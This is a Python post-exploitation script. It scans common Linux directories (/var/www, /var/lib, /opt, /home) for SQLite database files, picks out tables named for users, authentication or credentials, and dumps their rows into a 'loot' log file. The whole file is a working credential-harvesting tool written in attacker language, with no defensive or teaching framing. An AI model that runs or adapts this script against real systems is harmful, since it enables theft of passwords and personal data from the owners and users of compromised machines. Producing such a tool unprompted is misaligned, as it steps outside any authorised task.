import os
import sys
import subprocess

def harvest_sqlite(db_path):
    """Surgically harvests potential credentials from SQLite files."""
    print(f"[*] Analyzing SQLite DB: {db_path}")
    
    # Query to find tables that might contain sensitive data
    find_tables = "SELECT name FROM sqlite_master WHERE type='table' AND (name LIKE '%user%' OR name LIKE '%auth%' OR name LIKE '%cred%');"
    
    try:
        tables = subprocess.check_output(["sqlite3", db_path, find_tables]).decode().splitlines()
        for table in tables:
            print(f"[+] Targeting Table: {table}")
            # Extract common sensitive column names
            query = f"SELECT * FROM {table} LIMIT 50;"
            data = subprocess.check_output(["sqlite3", db_path, query]).decode()
            
            # Log to project loot
            loot_path = "../../../loot/db_harvest.log"
            with open(loot_path, "a") as log:
                log.write(f"--- DB: {db_path} | TABLE: {table} ---\n{data}\n")
                
    except Exception as e:
        print(f"[-] SQLite Harvest Fault: {e}")

def locate_databases():
    """Scans the system for common database file locations."""
    print("[*] Locating local database assets...")
    # Target common web app and system DB locations
    search_paths = ["/var/www", "/var/lib", "/opt", "/home"]
    found_dbs = []
    
    for path in search_paths:
        if os.path.exists(path):
            try:
                cmd = ["find", path, "-name", "*.db", "-o", "-name", "*.sqlite", "-o", "-name", "*.sqlite3"]
                found_dbs.extend(subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode().splitlines())
            except:
                pass
    return found_dbs

if __name__ == "__main__":
    dbs = locate_databases()
    if not dbs:
        print("[-] No local SQLite databases identified.")
    else:
        for db in dbs:
            harvest_sqlite(db)
        print(f"[!!!] SUCCESS: Harvest complete. Results in /loot/db_harvest.log")

